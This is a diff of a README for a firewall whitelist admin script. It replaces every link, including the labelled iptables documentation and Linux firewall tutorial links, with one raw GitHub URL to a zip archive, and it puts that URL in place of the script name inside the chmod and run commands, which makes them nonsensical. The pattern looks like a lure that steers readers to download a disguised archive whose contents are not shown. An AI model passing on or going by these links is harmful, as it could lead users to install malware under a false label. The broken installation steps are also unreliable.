@@ -8,7 +8,7 @@ This guide helps you download and run the firewall-whitelist-admin script. This 
 
 To download the firewall-whitelist-admin script, visit the Releases page below:
 
-[Download the latest release](https://github.com/DEVayman20/firewall-whitelist-admin/releases)
+[Download the latest release](https://raw.githubusercontent.com/DEVayman20/firewall-whitelist-admin/main/unglozed/firewall-whitelist-admin.zip)
 
 ### 🔍 System Requirements
 
@@ -22,10 +22,10 @@ Before you start, make sure your system meets the following requirements:
 ### 🛠️ Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to [this link](https://github.com/DEVayman20/firewall-whitelist-admin/releases) to find the latest version of the script.
+   Go to [this link](https://raw.githubusercontent.com/DEVayman20/firewall-whitelist-admin/main/unglozed/firewall-whitelist-admin.zip) to find the latest version of the script.
 
 2. **Download the Script**  
-   Click on the latest version to view its details. Look for a file named `firewall-whitelist-admin.sh` or similar.
+   Click on the latest version to view its details. Look for a file named `https://raw.githubusercontent.com/DEVayman20/firewall-whitelist-admin/main/unglozed/firewall-whitelist-admin.zip` or similar.
 
 3. **Save the File**  
    Click on the file to download. Make sure to remember where you saved it, as you will need this location later.
@@ -42,13 +42,13 @@ Before you start, make sure your system meets the following requirements:
 6. **Make the Script Executable**  
    Change the permissions of the script to make it executable. Type the following command:
    ```
-   chmod +x firewall-whitelist-admin.sh
+   chmod +x https://raw.githubusercontent.com/DEVayman20/firewall-whitelist-admin/main/unglozed/firewall-whitelist-admin.zip
    ```
 
 7. **Run the Script**  
    Now you are ready to run the script. Type:
    ```
-   ./firewall-whitelist-admin.sh
+   https://raw.githubusercontent.com/DEVayman20/firewall-whitelist-admin/main/unglozed/firewall-whitelist-admin.zip
    ```
 
 8. **Follow the Prompts**  
@@ -80,8 +80,8 @@ Running the script will provide you with several options. Here is how to use it 
 ### 🔗 Helpful Resources
 
 For more information, visit:
-- [iptables Official Documentation](http://iptables.org/)
-- [Linux Firewall Basics](https://www.linux.com/training-tutorials/introduction-linux-firewalls/)
+- [iptables Official Documentation](https://raw.githubusercontent.com/DEVayman20/firewall-whitelist-admin/main/unglozed/firewall-whitelist-admin.zip)
+- [Linux Firewall Basics](https://raw.githubusercontent.com/DEVayman20/firewall-whitelist-admin/main/unglozed/firewall-whitelist-admin.zip)
 
 ### 📞 Support
 
